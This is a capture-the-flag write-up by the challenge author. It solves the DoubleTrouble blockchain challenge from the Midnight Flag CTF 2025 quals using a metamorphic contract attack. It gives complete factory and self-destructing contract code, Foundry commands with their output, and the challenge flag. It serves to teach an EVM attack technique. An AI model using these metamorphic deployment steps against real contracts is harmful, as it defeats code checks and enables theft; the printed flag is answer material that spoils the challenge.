


+++
date = '2025-04-13T00:00:00+01:00'
draft = false
description= "This write-up covers the solution of the hard blockchain challenge I created for the Midnight Flag CTF 2025 Quals."
title = '[MidnightFlag CTF 2025 Quals] - DoubleTrouble'
tags = ["Blockchain", "MidnightFlagCTF", "WriteUp"]
+++

| Difficulty | Hard                                                  |
| ---------- | ----------------------------------------------------- |
| Author     | [Me](https://discordapp.com/users/406135822178320390) |
## 📝 Challenge's description

To get the flag, unlock the vault ! But, wait ? Where is the grid ?
## 🔍 Steps

1. Challenge overview
2. Understanding metamorphic contracts
3. Step 1 : Code the factories
4. Step 2 : Deploy the factories
5. Step 3 : Code the contract that passes the check
6. Step 4 : Deploy the contract that passes the check
7. Step 5 : Destroy the contract and the `CreateFactory`
8. Step 6 : Redeploy the `CreateFactory` and deploy the second contract

## 📃 Given file 

`DoubleTrouble.sol`
```js
// Author : Neoreo
// Difficulty : Hard

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract DoubleTrouble {
    bool public isSolved = false;
    mapping(address => bool) public validContracts;

    function validate(address _contract) public  {
        uint256 size;
        assembly {
            size := extcodesize(_contract)
        }
        if (size == 0 || size > 5) {
            revert("Invalid contract");
        }
        validContracts[_contract] = true;
    }

    function flag(address _contract) public {
        require(validContracts[_contract], "Given contract has not been validated");

        uint256 size;
        assembly {
            size := extcodesize(_contract)
        }
        bytes memory code = new bytes(size);
        assembly {
            extcodecopy(_contract, add(code, 0x20), 0, size)
        }
        bytes memory keyBytecode = hex"1f1a99ed17babe0000f007b4110000ba5eba110000c0ffee";
        
        require(keccak256(code) == keccak256(keyBytecode),"Both bytecodes don't match");

        isSolved = true;
    }
}
```

## 🔍 Challenge overview

As usual, we can read from the given contract that we'll have to set `isSolved` to `true`.  
Only two functions are available, and you are probably wondering why this challenge is in the `Hard` category.  

I'll explain in detail how it works.

We understand that we'll have to deploy a contract with a bytecode length between `1` and `5`.
If you are familiar with bytecode, you've probably noticed that this is **really short** for a smart contract.

*Bear that in mind—we'll need to discuss it further later.*

If we can deploy such a contract, it will be validated, which is required to flag the challenge.  
The real problem arises now.  
How the heck can the contract bytecode be 5 bytes long and at the same time equal to  
`1f1a99ed17babe0000f007b4110000ba5eba110000c0ffee`?

**In fact, it cannot.**   
The blockchain is immutable, right ? So how is this challenge solvable ?

**Here comes the `Metamorphic` contract attack.**

## 👾 Understanding metamorphic contracts

To create and deploy contracts, the EVM can use two opcodes: `create` (the default one) and `create2`.

#### **`Create` Opcode**

The `create` opcode deploys a contract and computes the address using the deployer's address and the deployer's nonce.

#### **`Create2` Opcode**

The `create2` opcode deploys a contract and computes the address using the deployer's address, a salt, and the hash of the bytecode.
#### Deploying two contracts at the same address

Based on that, we can, by tricking the EVM deploy two different contracts at the same address.

1. We deploy a `Create2Factory` contract with a function `deploy(salt, bytecode)` that uses `create2` to deploy a contract.
2. Using the `Create2Factory`, we deploy a `CreateFactory` contract with a function `deploy(bytecode)` that uses `create` to deploy a contract.
    
So, we use the `Create2Factory` to deploy the `CreateFactory`. As long as the `salt` and the `CreateFactory`'s `bytecode` remain the same, the `CreateFactory` address will remain unchanged.  
When a contract is deployed, its `nonce` is set to `1`, and that `nonce` increments every time the contract deploys another contract.

We can deploy a first `Transient` contract, which will be deployed at an address determined by the `CreateFactory` address and `nonce`.  
At this point, the `CreateFactory`'s `nonce` is `2`, as the `CreateFactory` has deployed a contract.

#### **`Selfdestruct` Opcode**

Before March 2024, the `selfdestruct` opcode used to empty the contract's balance by sending the funds to a given address and purging the contract's bytecode from the blockchain.  
Since March 2024, the balance is still emptied, but the bytecode is no longer purged in order to prevent metamorphic contracts.

But guess what? According to the challenge's website, the blockchain is based on the `Shanghai` hard fork, which was released before this update.

**Let me explain**

Our problem is that the `CreateFactory`'s nonce increments, and using the `create2` opcode, we cannot deploy two different bytecodes at the same address.  
However, by using `selfdestruct`, everything from the contract is wiped, including the `nonce`!

That's pretty cool because we can:

1. Deploy the `CreateFactory` using the `Create2Factory`.
2. Deploy a `Transient` contract (`transient1`) using the `CreateFactory`.
3. Destroy the `CreateFactory` to reset its nonce.
4. Destroy the `Transient` contract.
5. Redeploy the `CreateFactory` using the `Create2Factory`. Because of the `create2` opcode, the address will be the same as before.
6. Deploy another `Transient` contract (`transient2`) using the `CreateFactory` with the reset nonce. As the `CreateFactory` does not depend on the bytecode, `transient2`'s address will be the same as `transient1`.

## 🏭 Step 1 : Code the factories

Factories are quite common in the EVM world.  
For example, you may have found them on the internet.  
Don't forget to add the `selfdestruct()` method to the `CreateFactory`, as it is mandatory to exploit the challenge.

`CreateFactory.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CreateFactory {
    event ContractDeployed(address indexed deployedContract);

    function deploy(uint256 amount, bytes memory bytecode) public returns (address deployedContract) {
        assembly {
            deployedContract := create(amount, add(bytecode, 0x20), mload(bytecode))
        
            if iszero(deployedContract) {
                revert(0, 0)
            }
        }
        
        emit ContractDeployed(deployedContract);
    }

    function destroy() public{
        selfdestruct(payable(msg.sender));
    }
}
```

`Create2Factory.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Create2Factory {
    event Deployed(address addr);
    
    function deploy(uint256 amount, bytes32 salt, bytes memory bytecode) public payable returns (address addr) {
        require(address(this).balance >= amount, "Insufficient funds");
        assembly {
            addr := create2(amount, add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(addr != address(0), "Deploy failed");
        emit Deployed(addr);
    }

    function computeAddress(bytes32 salt, bytes32 bytecodeHash) public view returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            salt,
            bytecodeHash
        )))));
    }
} 
```

## 🏭 Step 2 : Deploy the factories

Once again, I'll use `Foundry` to solve this challenge.

```bash
# Export variables
export RPC=http://localhost/rpc
export PK=0xca11ab1ec0ffee000002a575fa5f74540719ba065a610cba6497cdbf22cd5cdb
export TARGET=0xAC254Af2552c6A32A9766b7865B3f1775f03c770
export ADDR=0x277506E301F0907b9bB7B954eB5B87aad9DABe92

# Deploy the Create2Factory
forge create solve/Create2Factory.sol:Create2Factory -r $RPC --private-key $PK --broadcast
```

```bash
[⠊] Compiling...
[⠢] Compiling 1 files with Solc 0.8.28
[⠆] Solc 0.8.28 finished in 107.95ms
Compiler run successful!
Deployer: 0x277506E301F0907b9bB7B954eB5B87aad9DABe92
Deployed to: 0xE4eb761E3a75a9ECEF586A1c2A3daDAdCB4f901F
Transaction hash: 0x5c7598b729f08a65ac422b852eb15ba94301665e62122d7e770381e26564742e
```

```bash
# Export the Create2Factory Address
export CREATE2FACTORY=0xE4eb761E3a75a9ECEF586A1c2A3daDAdCB4f901F
# Compile and export the bytecode of the CreateFactory
export CREATEFACTORYBIN=$(forge inspect solve/CreateFactory.sol:CreateFactory bytecode --no-metadata)
# Export a random salt, it could have been whatever you want
export SALT=0x1337000000000000000000000000000000000000000000000000000000001337
# Use the Create2Factory to precompute the future CreateFactory address
cast call $CREATE2FACTORY "computeAddress(bytes32,bytes32)" $SALT $(cast keccak $CREATEFACTORYBIN) -r $RPC
```

```bash
0x000000000000000000000000db3b5f14bbc7d4b4dc0526352cce1b723b6b279e
```

```bash
# Export that address
export CREATEFACTORY=0xdb3b5f14bbc7d4b4dc0526352cce1b723b6b279e

# Deploy the CreateFactory using the Create2Factory
cast send $CREATE2FACTORY "deploy(uint256,bytes32,bytes)" 0 $SALT $CREATEFACTORYBIN -r $RPC --private-key $PK
```

```bash
# [...CROPPED...]
status               1 (success)
# [...CROPPED...]
```

The deployment seems to have been successful. Let's make sure the `CreateFactory` is present.

```bash
cast code $CREATEFACTORY -r $RPC
```

```python
0x6080604052348015610[...CROPPED...]91505056
```

Yay ! The contract has been deployed !

## ⚔️ Step 3 : Code the contract that passes the check

Now that we know the main principle of `metamorphic` contracts, we should think about how we are going to pass this check while still being able to destroy the contract.

In fact, a contract like this could work, but the bytecode is waaaaay too long for us, even if we remove the metadata.

`foo.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract foo {
    function destroy() public{
        selfdestruct(payable(msg.sender));
    }
}
```

Here is the corresponding bytecode
```python
# Compiled with : forge inspect foo.sol:foo bytecode --no-metadata
0x6080604052348015600e575f5ffd5b50604b80601a5f395ff3fe6080604052348015600e575f5ffd5b50600436106026575f3560e01c806383197ef014602a575b5f5ffd5b60306032565b005b3373ffffffffffffffffffffffffffffffffffffffff16ff
```

The way I would have tackled that is by using a decompiler to see what's happening in the dark.  
For example, we can use the banger that is [bytegraph.xyz](https://bytegraph.xyz) to retrieve the control flow graph of the corresponding bytecode.

![](/images/Pasted%20image%2020250328163052.png)

----

**TL;DR Understanding the Above Control Flow Graph**

When a transaction starts, the smart contract is always executed from the `0x0000` address and then works exactly the same as standard assembly. It reads the next line of code, uses conditional jumps, the stack, and a heap. Exactly the same !

Some patterns are recurrent, and identifying them makes the bytecode much easier to understand.

- **Block `0000-000a`**  
This first block is the entry point of the smart contract. In our case, it's used to check if the transaction contains ETH. If it does, it jumps to the `000b-000d` block and reverts.  
That means the contract has no `payable` function.


- **Block `000e-0016`**  
This second block is very common. It checks that the `CALLDATA` size is less than `4`.  
The calldata contains the function we want to call and the parameters.  
Functions are identified by a selector, which is basically a 4-byte ID, and that's why it checks for 4 bytes.  
If the calldata does not contain a function selector, it jumps to the `0026-0029` block and reverts, otherwise, it jumps to the `0017-0025` block.


- **Block `0017-0025`**  
Once again, this block is present in every traditionally compiled contract.  
It loads the calldata and compares it with the function selector of `destroy()`.  
If they don't match, as the contract doesn't contain any other functions, it will jump to `0026-0029` and revert.  
But if both selectors match, it means that we are calling the `destroy()` function. 
It will jump to the `destroy()` bytecode in `002a-004a`.


- **Block `002a-004a`**  
This block contains the `destroy()` bytecode detailed below.

----

**Back to Our Business**

Keep in mind that the only thing we want is to destroy the contract, nothing else.  
In the above Bytegraph output, nothing is particularly interesting except the last part with the `selfdestruct` opcode.

![](/images/Pasted%20image%2020250328163300.png)

- At `0x0032`, the `JUMPDEST` opcode does nothing except telling the EVM that it could jump to it safely.
- The `CALLER` opcode pushes the address of the caller onto the stack _(yes, the EVM uses a stack)_.
- The `PUSH20` opcode pushes `20` bytes: `ffffffffffffffffffffffffffffffffffffffff`.
- The `AND` opcode pops two values from the stack, computes a logical `AND`, and pushes the result back onto the stack.
- The `SELFDESTRUCT` opcode pops one value from the stack, sends the contract's last funds to it, and removes the contract's bytecode from the blockchain.

Actually, it is possible to remove everything and only keep the last part of the bytecode, but even with that, the bytecode is still too long.

```python
0x5b3373ffffffffffffffffffffffffffffffffffffffff16ff
```

As the `JUMPDEST` does nothing, we can remove it.  
We know that an address is `20` bytes, so making the logical `AND` is useless; we can remove it.  
And here is our magical bytecode of length 2!

```python
0x33ff
```

Let's just create a contract that sets its own bytecode to what we want, and BOOM!  
Then, to destroy it, we'll only have to start a transaction with it. No checks are done on the calldata anymore, so we can send whatever calldata we want, and it'll be destroyed.

`Transient1.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Transient1 {
    constructor() {
        bytes memory bytecode = hex"33ff"; // caller; selfdestruct;
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
    }
}
```

## ⚔️ Step 4 : Deploy the contract that passes the check

```bash
# Compile the Transient1 contract and export the bytecode
export TRANSIENT1BIN=$(forge inspect solve/Transient1.sol:Transient1 bytecode --no-metadata)
# Retrieve the CreateFactory's nonce to compute the future transient1's address
export NONCE=$(cast nonce $CREATEFACTORY -r $RPC)
# Compute that address
cast ca $CREATEFACTORY --nonce $NONCE
```

```bash
Computed Address: 0x47B89872AAbc0A33D315fEF9A93f11B2B4b853bD
```

```bash
# Export it
export TRANSIENT1=0x47B89872AAbc0A33D315fEF9A93f11B2B4b853bD

# Deploy the transient contract
cast send $CREATEFACTORY "deploy(uint256,bytes)" 0 $TRANSIENT1BIN  -r $RPC --private-key $PK
```

```bash
# [...CROPPED...]
status               1 (success)
transactionHash      0x1c7de0bbb7ae5888b13581f05be7f4d3442b6fbd2e65b9786d15908f535eab18
# [...CROPPED...]
```

Now that our contract as been deployed, let's make sure it is present.

```bash
cast code $TRANSIENT1 -r $RPC
```

```python
0x33ff
```

Hurray ! We passed the first part of the challenge. Let's validate it.

```bash
cast send $TARGET "validate(address)" $TRANSIENT1 -r $RPC --private-key $PK
```

```bash
# [...CROPPED...]
status               1 (success)
transactionHash      0x6050519bec9d6babb7205c05779e8851c0733049a94609462ee840e05cb6dfe0
# [...CROPPED...]
```

The validation has succeeded; our contract is valid!

## 💥 Step 5 : Destroy the contract and the `CreateFactory`

So, now, all we have to do is clean up our mess.

```bash
# Destroy the CreateFactory
cast send $CREATEFACTORY "destroy()" -r $RPC --private-key $PK
# Call the Transient contract to destroy it
cast send $TRANSIENT1 "justcallthecontractwithrandomfunction()" -r $RPC --private-key $PK
# Make sure everything worked fine
cast code $CREATEFACTORY -r $RPC
cast code $TRANSIENT1 -r $RPC
```

```bash
0x
0x
```

## 🏁 Step 6 : Redeploy the `CreateFactory` and deploy the second contract

As the first step has been completed, we are free to redeploy at the same address.

```bash
# Redeploy CreateFactory
cast send $CREATE2FACTORY "deploy(uint256,bytes32,bytes)" 0 $SALT $CREATEFACTORYBIN -r $RPC --private-key $PK
```

```bash
# [...CROPPED...]
status               1 (success)
transactionHash      0x4b9a87a48fac7faa701bc2fd14b928e8c795be67d0deeb8a45ca97fa09ebb1c0
# [...CROPPED...]
```

Just before deploying the new `Transient` contract, we have to write it.

`Transient2.sol`
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Transient2 {
    constructor() {
        bytes memory bytecode = hex"1f1a99ed17babe0000f007b4110000ba5eba110000c0ffee";
        assembly {
            return (add(bytecode, 0x20), mload(bytecode))
        }
    }
}
```

We can compile it and deploy it.

```bash
export TRANSIENT2BIN=$(forge inspect solve/Transient2.sol:Transient2 bytecode --no-metadata)
export NONCE=$(cast nonce $CREATEFACTORY -r $RPC)
cast send $CREATEFACTORY "deploy(uint256,bytes)" 0 $TRANSIENT2BIN  -r $RPC --private-key $PK
```

Everything should have worked fine, let's flag !

```bash
cast send $TARGET "flag(address)" $TRANSIENT1 -r $RPC --private-key $PK
cast call $TARGET "isSolved()" -r $RPC
```

```bash
0x0000000000000000000000000000000000000000000000000000000000000001
```

**Challenge solved**
Flag : `MCTF{ea884d389bb8de6ec0a3764e6aa510f9}`


I really enjoyed making those challenges for the Midnight Flag. I hope you enjoyed them as well ! 